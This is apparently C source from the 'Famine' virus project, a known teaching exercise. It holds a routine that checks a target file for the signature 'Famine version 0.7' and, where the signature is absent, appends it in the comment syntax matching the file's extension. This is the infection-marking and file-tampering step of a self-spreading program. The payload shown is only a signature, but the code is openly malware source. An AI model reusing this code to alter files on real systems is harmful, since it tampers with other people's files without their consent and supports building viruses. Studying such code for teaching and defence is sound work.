#include "famine.h"

char *get_extension(char *name_file) {
    char *base = strrchr(name_file, '/');
    if (base == NULL)
        base = name_file;
    else
        base = base + 1;

    int i;
    for (i = strlen(base) - 1; i > 0; i--) {
        if (base[i] == '.')
            return &base[i];
    }
    return NULL;
}

int handle_other_file(char *name_file) {
    int fd = open(name_file, O_RDONLY);
    if (fd < 0) {
        return -1;
    }

    unsigned long file_size = lseek(fd, 0, SEEK_END);
    if (file_size <= 0){
        close(fd);
        return -1;
    }

    unsigned char *file = mmap(NULL, file_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
    if (file == MAP_FAILED) {
        close(fd);
        return -1;
    }

    if (memmem(file, file_size, "Famine version 0.7", strlen("Famine version 0.7"))) {
        munmap(file, file_size);
        close(fd);
        return -1;
    }

    munmap(file, file_size);
    close(fd);
    fd = open(name_file, O_WRONLY | O_APPEND);
    if (fd < 0) {
        return -1;
    }

    char *ext = get_extension(name_file);
    char *payload;

    if (ext != NULL) {
        if (strcmp(ext, ".c") == 0 || strcmp(ext, ".cpp") == 0 || strcmp(ext, ".h") == 0 || strcmp(ext, ".hpp") == 0 || strcmp(ext, ".java") == 0 || strcmp(ext, ".js") == 0 || strcmp(ext, ".ts") == 0 || strcmp(ext, ".json") == 0)
            payload = "\n// Famine version 0.7 (c)oded jul-0000 by bob\n";
        else if (strcmp(ext, ".py") == 0 || strcmp(ext, ".sh") == 0 || strcmp(ext, ".rb") == 0 || strcmp(ext, ".pl") == 0)
            payload = "\n# Famine version 0.7 (c)oded jul-0000 by bob\n";
        else if (strcmp(ext, ".s") == 0 || strcmp(ext, ".asm") == 0)
            payload = "\n; Famine version 0.7 (c)oded jul-0000 by bob\n";
        else if (strcmp(ext, ".php") == 0)
            payload = "\n// Famine version 0.7 (c)oded jul-0000 by bob\n";
        else if (strcmp(ext, ".html") == 0 || strcmp(ext, ".md") == 0)
            payload = "\n<!-- Famine version 0.7 (c)oded jul-0000 by bob -->\n";
        else if (strcmp(ext, ".css") == 0)
            payload = "\n/* Famine version 0.7 (c)oded jul-0000 by bob */\n";
        else
            payload = "\nFamine version 0.7 (c)oded jul-0000 by bob\n";
    }
    else {
        payload = "\nFamine version 0.7 (c)oded jul-0000 by bob\n";
    }

    write(fd, payload, strlen(payload));

    close(fd);
    return 0;
}